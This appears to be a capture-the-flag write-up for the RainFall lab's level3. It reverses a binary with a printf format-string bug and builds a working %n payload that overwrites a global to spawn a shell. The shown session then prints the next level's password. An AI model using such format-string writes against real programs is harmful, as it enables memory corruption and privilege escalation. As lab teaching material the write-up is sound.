
# Source Code

<table  style="margin: 0 auto;">
  <tr>
    <th>Assembly Code</th>
    <th>its equivalent in C Code</th>
  </tr>
  <tr>
    <td>
      <pre><code class="language-asm">
Dump of assembler code for function main:
   0x0804851a <+0>:     push   ebp
   0x0804851b <+1>:     mov    ebp,esp
   0x0804851d <+3>:     and    esp,0xfffffff0
   0x08048520 <+6>:     call   0x80484a4 v
   0x08048525 <+11>:    leave
   0x08048526 <+12>:    ret

Dump of assembler code for function v:
   0x080484a4 <+0>:     push   ebp
   0x080484a5 <+1>:     mov    ebp,esp
   0x080484a7 <+3>:     sub    esp,0x218
   0x080484ad <+9>:     mov    eax,ds:0x8049860
   0x080484b2 <+14>:    mov    DWORD PTR [esp+0x8],eax
   0x080484b6 <+18>:    mov    DWORD PTR [esp+0x4],0x200
   0x080484be <+26>:    lea    eax,[ebp-0x208]
   0x080484c4 <+32>:    mov    DWORD PTR [esp],eax
   0x080484c7 <+35>:    call   0x80483a0 <fgets@plt>
   0x080484cc <+40>:    lea    eax,[ebp-0x208]
   0x080484d2 <+46>:    mov    DWORD PTR [esp],eax
   0x080484d5 <+49>:    call   0x8048390 <printf@plt>
   0x080484da <+54>:    mov    eax,ds:0x804988c
   0x080484df <+59>:    cmp    eax,0x40
   0x080484e2 <+62>:    jne    0x8048518 <v+116>
   0x080484e4 <+64>:    mov    eax,ds:0x8049880
   0x080484e9 <+69>:    mov    edx,eax
   0x080484eb <+71>:    mov    eax,0x8048600
   0x080484f0 <+76>:    mov    DWORD PTR [esp+0xc],edx
   0x080484f4 <+80>:    mov    DWORD PTR [esp+0x8],0xc
   0x080484fc <+88>:    mov    DWORD PTR [esp+0x4],0x1
   0x08048504 <+96>:    mov    DWORD PTR [esp],eax
   0x08048507 <+99>:    call   0x80483b0 <fwrite@plt>
   0x0804850c <+104>:   mov    DWORD PTR [esp],0x804860d
   0x08048513 <+111>:   call   0x80483c0 <system@plt>
   0x08048518 <+116>:   leave
   0x08048519 <+117>:   ret
      </code></pre>
    </td>
    <td>
      <pre><code class="language-c">
int m;

int v() {
  char buffer[520];

  fgets(buffer, 512, stdin);
  printf(buffer);
  if (m == 64) {
    fwrite("Wait what?!\n", 1, 0xC, stdout);
    system("/bin/sh");
  }
}

int main() {
  v();
}
      </code></pre>
    </td>
  </tr>
</table>



# Exploring
Our Goal is make `m` variable equal 64 to gain shell access `system("/bin/sh")`.

At first look on the source code, the `main` call `v` function wich read 512 char from stdin, only 512 (less than 520: size of buffer variable `buffer[520]`) and no more a condition `fgets` that's not vulnerable to buffer overflow like previous `gets`.

So, how can we modify the `m` variable ?

We have `printf` that take out input string as format string.

Wait, can this format of printf `printf(buffer)` to be vulnerable ?

---
In printf, the **n** specifier writes the number of characters printed so far into the memory location pointed to by the corresponding argument.

The **$** notation lets you choose which argument to use. For example, in **%6$n**:

- **n** is a specifier that writes the number of characters printed so far into the address provided by that argument.
- **6$** tells printf to use the sixth argument.
---

From the small brief about `printf`, we can modify the `m` with the number of characters printed so far.

# Exploiting

From our observation of this test:
```test
level3@RainFall:~$ ./level3
%010x.%07$x.aaaa
0000000200.61616161.aaaa
```


we see that `aaaa` comes on the 7st arg represented by hex (`61616161`).
So, `aaaa` become the address of `m` variable (little-endian system of course).

```test output
%010x.%07$x.aaaa
  ^^ ^    ^ ^^^^
  1  2    3   4
```
1: will change to 63 (64 - 1,  1 for the dot `.` `2`).

3: will be `n` (the pecifier that writes the number of characters ... ).

4: will change to address of `m` in litte-endian system.

from this asm line `0x080484da <+54>:  mov   eax,ds:0x804988c`, the `m` address is `0x804988c` (`\x8c\x98\x04\x08`: little-endian).

The final payload is:
```payload
%063x.%07$n.\x8c\x98\x04\x08
```

Ok, let's test it.
```
level3@RainFall:~$ (echo -n '%063x.%07$n.'; printf '\x8c\x98\x04\x08\n'; cat) | ./level3
000000000000000000000000000000000000000000000000000000000000200..
Wait what?!
whoami
level4
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```

Great, its work, see you in the next level `level4`.
